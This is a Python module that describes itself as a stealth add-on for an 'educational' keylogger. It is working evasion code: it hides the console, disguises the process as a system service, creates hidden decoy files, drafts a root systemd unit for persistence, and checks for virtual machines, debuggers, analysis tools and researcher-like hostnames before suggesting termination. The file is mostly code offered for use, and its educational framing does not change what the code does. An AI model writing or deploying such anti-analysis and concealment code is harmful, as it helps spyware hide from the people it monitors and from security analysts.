#!/usr/bin/env python3
"""
Stealth Enhancement Module for Educational Keylogger

This module provides additional stealth features to make the keylogger
less detectable during educational testing.
"""

import os
import sys
import time
import psutil
import platform
import subprocess
import threading
from datetime import datetime
import ctypes

# Conditional imports based on platform
if platform.system() == "Windows":
    try:
        import winreg
    except ImportError:
        winreg = None
else:
    winreg = None


class StealthManager:
    def __init__(self):
        self.system = platform.system()
        self.original_name = sys.argv[0]
        
    def hide_console_window(self):
        """Hide console window on Windows"""
        if self.system == "Windows":
            try:
                # Hide console window
                hwnd = ctypes.windll.kernel32.GetConsoleWindow()
                if hwnd != 0:
                    ctypes.windll.user32.ShowWindow(hwnd, 0)
                return True
            except Exception as e:
                print(f"Error hiding console: {e}")
                return False
        return False
    
    def change_process_name(self, new_name="System Service"):
        """Change process name to appear less suspicious"""
        try:
            if self.system == "Linux":
                try:
                    import prctl
                    prctl.set_name(new_name)
                except ImportError:
                    print("prctl not available, skipping process name change")
                    return False
            elif self.system == "Windows":
                # On Windows, we can't easily change the process name
                # but we can rename the executable
                pass
            return True
        except Exception as e:
            print(f"Error changing process name: {e}")
            return False
    
    def create_fake_system_process(self):
        """Create a fake system process appearance"""
        fake_names = [
            "System Service Host",
            "Windows Security Service",
            "System Update Manager",
            "Network Configuration Service",
            "Hardware Monitor Service"
        ]
        
        import random
        return random.choice(fake_names)
    
    def check_vm_environment(self):
        """Check if running in a virtual machine"""
        vm_indicators = []
        
        try:
            # Check for VM-specific processes
            vm_processes = ['vmware', 'virtualbox', 'vbox', 'qemu', 'xen']
            for proc in psutil.process_iter(['name']):
                if any(vm_proc in proc.info['name'].lower() for vm_proc in vm_processes):
                    vm_indicators.append(f"VM process detected: {proc.info['name']}")
            
            # Check system manufacturer
            if self.system == "Windows":
                try:
                    import wmi
                    c = wmi.WMI()
                    for system in c.Win32_ComputerSystem():
                        if any(vm in system.Manufacturer.lower() for vm in ['vmware', 'microsoft corporation', 'xen']):
                            vm_indicators.append(f"VM manufacturer: {system.Manufacturer}")
                except ImportError:
                    print("WMI module not available, skipping manufacturer check")
                except Exception:
                    pass
            
            # Check for VM-specific hardware
            if self.system == "Linux":
                try:
                    with open('/proc/cpuinfo', 'r') as f:
                        cpu_info = f.read().lower()
                        if 'vmware' in cpu_info or 'qemu' in cpu_info:
                            vm_indicators.append("VM CPU detected")
                except:
                    pass
            
            return vm_indicators
            
        except Exception as e:
            print(f"Error checking VM environment: {e}")
            return []
    
    def anti_debug_checks(self):
        """Basic anti-debugging checks"""
        debug_indicators = []
        
        try:
            # Check for debugger processes
            debug_processes = ['gdb', 'ollydbg', 'windbg', 'x64dbg', 'ida', 'cheat engine']
            for proc in psutil.process_iter(['name']):
                if any(debug_proc in proc.info['name'].lower() for debug_proc in debug_processes):
                    debug_indicators.append(f"Debugger detected: {proc.info['name']}")
            
            # Check if being traced (Linux)
            if self.system == "Linux":
                try:
                    with open('/proc/self/status', 'r') as f:
                        status = f.read()
                        if 'TracerPid:\t0' not in status:
                            debug_indicators.append("Process is being traced")
                except:
                    pass
            
            # Timing checks (anti-debug)
            start_time = time.time()
            time.sleep(0.01)  # Should be very fast
            elapsed = time.time() - start_time
            if elapsed > 0.05:  # If it took too long, might be debugged
                debug_indicators.append(f"Timing anomaly detected: {elapsed:.4f}s")
            
            return debug_indicators
            
        except Exception as e:
            print(f"Error in anti-debug checks: {e}")
            return []
    
    def create_decoy_files(self):
        """Create decoy files to mask real purpose"""
        decoy_files = {
            "system_update.log": "System Update Log\n" + "="*20 + "\n" + 
                               f"Last check: {datetime.now()}\n" +
                               "All systems operational\n",
            
            "network_config.txt": "Network Configuration\n" + "="*25 + "\n" +
                                "Interface: eth0\n" +
                                "Status: Connected\n" +
                                "IP: 192.168.1.100\n",
            
            "hardware_monitor.dat": "Hardware Monitoring Service\n" + "="*30 + "\n" +
                                  f"CPU Temperature: 45°C\n" +
                                  f"RAM Usage: 68%\n" +
                                  f"Disk Usage: 42%\n"
        }
        
        try:
            for filename, content in decoy_files.items():
                with open(filename, 'w') as f:
                    f.write(content)
                
                # Hide files on Windows
                if self.system == "Windows":
                    try:
                        subprocess.run(['attrib', '+H', filename], check=True, 
                                     capture_output=True)
                    except:
                        pass
            
            return True
        except Exception as e:
            print(f"Error creating decoy files: {e}")
            return False
    
    def setup_fake_service(self):
        """Setup fake service appearance"""
        if self.system == "Windows":
            return self._setup_windows_service()
        elif self.system == "Linux":
            return self._setup_linux_service()
        return False
    
    def _setup_windows_service(self):
        """Setup fake Windows service"""
        try:
            # This would require admin privileges in real scenario
            # For educational purposes, just simulate
            service_info = {
                "Name": "SystemConfigurationManager",
                "DisplayName": "System Configuration Manager",
                "Description": "Manages system configuration and updates",
                "StartType": "Automatic",
                "Status": "Running"
            }
            
            print(f"Fake service configured: {service_info['DisplayName']}")
            return True
        except Exception as e:
            print(f"Error setting up Windows service: {e}")
            return False
    
    def _setup_linux_service(self):
        """Setup fake Linux service"""
        try:
            # Create a fake systemd service file (educational)
            service_content = f"""[Unit]
Description=System Configuration Manager
After=network.target

[Service]
Type=simple
ExecStart={sys.executable} {os.path.abspath(sys.argv[0])}
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
"""
            
            # Note: This is just for educational demonstration
            print("Fake Linux service configuration created")
            return True
        except Exception as e:
            print(f"Error setting up Linux service: {e}")
            return False
    
    def monitor_system_activity(self):
        """Monitor for suspicious system activity"""
        def activity_monitor():
            while True:
                try:
                    # Monitor CPU usage
                    cpu_percent = psutil.cpu_percent(interval=1)
                    
                    # Monitor memory usage
                    memory = psutil.virtual_memory()
                    
                    # Monitor network activity
                    network = psutil.net_io_counters()
                    
                    # Check for analysis tools
                    suspicious_processes = ['wireshark', 'tcpdump', 'netstat', 'ss', 'lsof']
                    for proc in psutil.process_iter(['name']):
                        if any(susp in proc.info['name'].lower() for susp in suspicious_processes):
                            print(f"⚠️  Suspicious process detected: {proc.info['name']}")
                    
                    time.sleep(30)  # Check every 30 seconds
                    
                except Exception as e:
                    print(f"Error in activity monitor: {e}")
                    time.sleep(60)
        
        # Start monitoring in background thread
        monitor_thread = threading.Thread(target=activity_monitor, daemon=True)
        monitor_thread.start()
        return True
    
    def self_destruct_check(self):
        """Check for self-destruct conditions"""
        destruct_conditions = []
        
        try:
            # Check if running in analysis environment
            analysis_indicators = [
                'sandbox', 'analyst', 'malware', 'virus', 'security',
                'research', 'lab', 'test', 'sample'
            ]
            
            # Check hostname
            hostname = platform.node().lower()
            if any(indicator in hostname for indicator in analysis_indicators):
                destruct_conditions.append(f"Suspicious hostname: {hostname}")
            
            # Check username
            username = os.getlogin().lower() if hasattr(os, 'getlogin') else ''
            if any(indicator in username for indicator in analysis_indicators):
                destruct_conditions.append(f"Suspicious username: {username}")
            
            # Check for analysis tools in PATH
            analysis_tools = ['ida', 'ollydbg', 'wireshark', 'procmon', 'regshot']
            for tool in analysis_tools:
                if subprocess.run(['which', tool], capture_output=True).returncode == 0:
                    destruct_conditions.append(f"Analysis tool found: {tool}")
            
            return destruct_conditions
            
        except Exception as e:
            print(f"Error in self-destruct check: {e}")
            return []
    
    def enable_all_stealth_features(self):
        """Enable all stealth features"""
        print("🔒 Enabling stealth features...")
        
        results = {
            'console_hidden': self.hide_console_window(),
            'process_renamed': self.change_process_name(),
            'decoy_files': self.create_decoy_files(),
            'fake_service': self.setup_fake_service(),
            'monitoring': self.monitor_system_activity()
        }
        
        # Check environment
        vm_indicators = self.check_vm_environment()
        debug_indicators = self.anti_debug_checks()
        destruct_conditions = self.self_destruct_check()
        
        print(f"📊 Environment Analysis:")
        print(f"   VM Environment: {'Yes' if vm_indicators else 'No'}")
        print(f"   Debug Detection: {'Yes' if debug_indicators else 'No'}")
        print(f"   Analysis Environment: {'Yes' if destruct_conditions else 'No'}")
        
        if vm_indicators:
            print(f"   VM Indicators: {', '.join(vm_indicators)}")
        
        if debug_indicators:
            print(f"   Debug Indicators: {', '.join(debug_indicators)}")
        
        if destruct_conditions:
            print(f"   ⚠️  Analysis Indicators: {', '.join(destruct_conditions)}")
            print(f"   Consider terminating for safety")
        
        successful_features = sum(1 for success in results.values() if success)
        total_features = len(results)
        
        print(f"✅ Stealth features enabled: {successful_features}/{total_features}")
        
        return results


# Example usage
if __name__ == "__main__":
    stealth = StealthManager()
    stealth.enable_all_stealth_features()